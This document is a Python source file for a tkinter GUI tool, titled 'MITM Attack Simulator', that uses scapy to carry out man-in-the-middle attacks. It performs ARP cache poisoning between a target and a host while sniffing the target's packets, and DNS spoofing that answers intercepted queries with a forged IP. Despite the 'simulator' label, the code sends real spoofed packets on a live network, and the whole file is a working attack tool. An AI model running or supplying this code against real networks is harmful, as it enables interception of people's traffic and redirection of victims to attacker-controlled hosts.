import tkinter as tk
from tkinter import messagebox
import threading
import time
from scapy.all import send, get_if_hwaddr, conf, sniff, sr
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether, srp
from scapy.layers.dns import DNS, DNSRR


class MITMAttackApp:
    def __init__(self, master):
        self.master = master
        master.title("MITM Attack Simulator")
        self.attacking = False
        self.attack_type = tk.StringVar()
        self.show_main_gui()

    def clear_gui(self):
        for widget in self.master.winfo_children():
            widget.grid_forget()

    def back_to_main(self):
        self.attacking = False
        self.show_main_gui()

    def show_main_gui(self): # Choose ARP or DNS  主界面
        self.clear_gui()
        self.attack_type = tk.StringVar()
        tk.Label(self.master, text = "Select your MITM Attack Type").grid(row=0,column=1)
        tk.Radiobutton(self.master, text="ARP Spoofing", variable=self.attack_type, value="ARP",
                       command=self.show_arp_gui).grid(row=1, column=0, columnspan=2, pady=10)
        tk.Radiobutton(self.master, text="DNS Spoofing", variable=self.attack_type, value="DNS",
                       command=self.show_dns_gui).grid(row=2, column=0, columnspan=2, pady=10)

    def show_arp_gui(self):  # ARP  arp界面
        self.clear_gui()
        self.attacking = False

        self.target_ip = tk.StringVar()
        self.host_ip = tk.StringVar()

        tk.Label(self.master, text="Target IP:").grid(row=0)
        tk.Entry(self.master, textvariable=self.target_ip).grid(row=0, column=1)
        tk.Label(self.master, text="Host IP:").grid(row=1)
        tk.Entry(self.master, textvariable=self.host_ip).grid(row=1, column=1)

        self.start_button = tk.Button(self.master, text="Start Attack", command=self.start_attack)
        self.start_button.grid(row=2, column=0)
        self.stop_button = tk.Button(self.master, text="Stop Attack", command=self.stop_attack)
        self.stop_button.grid(row=2, column=1)

        self.log_text = tk.Text(self.master, height=20, width=70, state="disabled")
        self.log_text.grid(row=4, column=0, columnspan=2, pady=10)

        self.back_button = tk.Button(self.master, text="Back", command=self.back_to_main)
        self.back_button.grid(row=3, column=1)

    def show_dns_gui(self):
        self.clear_gui()
        self.attacking = False

        self.dns_target_ip = tk.StringVar()
        self.fake_ip = tk.StringVar()

        tk.Label(self.master, text="DNS Target IP:").grid(row=0, column=0)
        tk.Entry(self.master, textvariable=self.dns_target_ip).grid(row=0, column=1)
        tk.Label(self.master, text="Fake IP for Spoofed DNS:").grid(row=1, column=0)
        tk.Entry(self.master, textvariable=self.fake_ip).grid(row=1, column=1)


        self.start_button = tk.Button(self.master, text="Start Attack", command=self.start_attack)
        self.start_button.grid(row=2, column=0)
        self.stop_button = tk.Button(self.master, text="Stop Attack", command=self.stop_attack)
        self.stop_button.grid(row=2, column=1)

        self.log_text = tk.Text(self.master, height=20, width=70, state="disabled")
        self.log_text.grid(row=4, column=0, columnspan=2, pady=10)

        self.back_button = tk.Button(self.master, text="Back", command=self.back_to_main)
        self.back_button.grid(row=3, column=1)

    def log(self, message):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.config(state="disabled")
        self.log_text.see(tk.END)

    def attack(self):
        if self.attack_type.get() == "ARP":
            self.arp_attack()
        elif self.attack_type.get() == "DNS":
            self.dns_attack()

    def arp_attack(self):  # 执行中间人攻击
        self.attacking = True
        target_ip = self.target_ip.get()
        host_ip = self.host_ip.get()

        threading.Thread(target=self.capture_arp_packets).start()

        while self.attacking:
            self.spoof(target_ip, host_ip)
            self.spoof(host_ip, target_ip)
            time.sleep(2)

    def spoof(self, target_ip, host_ip):
        target_mac = self.get_target_mac(target_ip)
        arp_response = ARP(op=2, psrc=host_ip, hwsrc=get_if_hwaddr(conf.iface), pdst=target_ip, hwdst=target_mac)
        send(arp_response, verbose=False)
        self.log(f"Send ARP response to {target_ip} pretening to be {host_ip}")

    def get_target_mac(self,target_ip):
        arp_request = ARP(op=1, pdst=target_ip)  # ARP request
        answered_list = sr(arp_request, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc if answered_list else None

    def capture_arp_packets(self):
        sniff(prn=self.process_arp_packet, filter=f"ip host {self.target_ip.get()}", store=0, stop_filter=lambda x: not self.attacking)

    def process_arp_packet(self, packet):
        if IP in packet:
            message = f"Captured Packet: {packet.summary()}"
            self.log(message)

    def dns_attack(self):
        self.attacking = True
        threading.Thread(target=self.capture_dns_packets, args=("DNS",)).start()

    def capture_dns_packets(self):
        target_ip = self.dns_target_ip.get()
        fake_ip = self.fake_ip.get()

        def process_dns_packet(packet):
            if packet.haslayer(DNS) and packet[DNS].qr == 0:
                dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                               UDP(dport=packet[UDP].sport, sport=53) / \
                               DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                   an=DNSRR(rrname=packet[DNS].qd.qname, rdata=fake_ip))
                send(dns_response, verbose=False)
                self.log(f"Spoofed DNS response sent for {packet[DNS].qd.qname} to {fake_ip}")

        sniff(filter=f"udp port 53 and ip dst {target_ip}", prn=process_dns_packet,
              stop_filter=lambda _: not self.attacking)


    def start_attack(self):  # Start the attack
        if not self.attacking:
            self.thread = threading.Thread(target=self.attack)
            self.thread.start()
            self.log("Attack started ... ")

    def stop_attack(self):  # Stop the attack
        self.attacking = False
        self.log("Attack Stopped.")
        messagebox.showinfo("Attack Stopped", "The attack has been stopped.")

if __name__ == "__main__":
    root = tk.Tk()
    app = MITMAttackApp(root)
    root.mainloop()
